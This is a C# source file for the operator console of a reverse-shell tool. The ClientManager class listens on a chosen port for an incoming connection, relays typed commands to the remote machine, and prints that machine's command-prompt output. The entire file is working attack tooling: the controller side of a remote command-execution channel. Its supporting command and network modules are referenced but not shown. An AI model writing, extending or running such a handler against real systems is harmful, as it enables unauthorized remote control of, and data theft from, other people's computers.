using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Commands;
using NetworkManager;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        bool processingCommand;


        public ClientManager()
        {
            processingCommand = false;
            Console.ForegroundColor = ConsoleColor.Green;
        }


        public void Start()
        {
            ShowBanner();

            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                    }
                    catch (Exception)
                    {
                        Console.WriteLine(@"... please ...");
                    }
                }

                // Listen and start connection
                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);

                // Process data sent by the server in a new task
                var runClient = new Task(ProcessIncomingData);
                runClient.Start();

                // Process user input
                ProcessInput();
                
                // Connection ended, ask listen again
                listen = AskListenAgain();
            }
        }


        void ProcessIncomingData()
        {
            while (true)
            {
                try
                {
                    var data = GlobalNetworkManager.ReadLine();
                    if (data == null)
                    {
                        continue;
                    }// to remove ??

                    var command = CommandsManager.GetCommandByFlag(data);
                    if (command != null)
                    {
                        // Call client method
                        command.ClientMethod(null);
                        command.savedData?.Clear();
                        processingCommand = false;
                    }
                    else
                    {
                        // Normal output (text)
                        // Check if the line isn't the one representing the path in the cmd
                        if (!(data[data.Length - 1] == '>' && data.Contains(@":\")))
                        {
                            // Add line return
                            Console.WriteLine(data);
                        }
                        else
                        {
                            // Display cmd path without line return
                            Console.Write(data);
                        }
                    }
                }
                catch (Exception)
                {
                    // An exception will be catched if the client used the "exit" command, the cleanup is already done
                    if (GlobalNetworkManager.clientNetworkManager.IsConnected())
                    {
                        Cleanup(false);
                    }
                    
                    break;
                }
            }
        }


        void ProcessInput()
        {
            while (true)
            {
                // If the connection was closed, break from the loop
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    processingCommand = false;
                    break;
                }
                // If not allowed to send commands, continue
                if (processingCommand)
                {
                    continue;
                }

                var commandString = Console.ReadLine();

                // Test again after the readline
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    break;
                }


                if (commandString == "clear" || commandString == "cls")
                {
                    // Clear console
                    Console.Clear();
                    GlobalNetworkManager.SayHello();
                }
                else if (commandString == "")
                {
                    GlobalNetworkManager.SayHello();
                }
                else
                {
                    var splittedCommand = commandString.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries).ToList();
                    var commandName = splittedCommand[0];

                    var command = CommandsManager.GetCommandByName(commandName);
                    if (command != null)
                    {
                        var arguments = new List<string>();

                        if (splittedCommand.Count > 1)
                        {
                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                        }


                        if (commandString.Contains("help")){
                            // Help commands section
                            if (commandString == "help")
                            {
                                CommandsManager.ShowGlobalHelp();
                            }
                            else
                            {
                                CommandsManager.ShowCommandHelp(command);
                            }

                            GlobalNetworkManager.SayHello();
                            continue;
                        }


                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
                        {
                            ColorTools.WriteCommandError($"Syntax error, check out the command's help page ({commandName} help)");
                            // Still display cmd again
                            GlobalNetworkManager.SayHello();
                            continue;
                        }


                        var preProcessResult = CommandsManager.PreProcessResult.OK;
                        try
                        {
                            preProcessResult = command.PreProcessCommand(arguments);
                        }
                        catch (NotImplementedException)
                        {
                            // Ignored
                        }

                        if (preProcessResult == CommandsManager.PreProcessResult.KO)
                        {
                            // Error in the PreProcess method
                            GlobalNetworkManager.SayHello();
                            continue;
                        }


                        if (command.isLocal)
                        {
                            try
                            {
                                command.ClientMethod(arguments);
                                command.savedData?.Clear();
                                GlobalNetworkManager.SayHello();
                                continue;
                            }
                            catch (ExitException)
                            {
                                Cleanup(true);
                                break;
                            }
                        }


                        if (preProcessResult != CommandsManager.PreProcessResult.NoClientProcess)
                        {
                            // Will have to wait for the process to finish in order to issue commands again
                            processingCommand = true;
                        }
                    }

                    // Send the data to the server
                    GlobalNetworkManager.WriteLine(commandString);
                }
            }
        }


        bool AskListenAgain()
        {
            Console.Write("Listen again ? (y/N) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input == "y" || input == "Y";
        }


        void Cleanup(bool IsExit)
        {
            try
            {
                GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand, IsExit);
            }
            catch (Exception)
            {
                // Ignored
            }
        }


        void ShowBanner()
        {
            Console.WriteLine(" _____ _     _       _      _     _             _       \n|     |_|___| |_ ___| |   _| |___| |___ ___ ___| |_ ___ \n| | | | |  _|   | -_| |  | . | -_| | . | -_|  _|   | -_|\n|_|_|_|_|___|_|_|___|_|  |___|___|_|  _|___|___|_|_|___|\n                                   |_|                  \n\n");
        }
    }
}
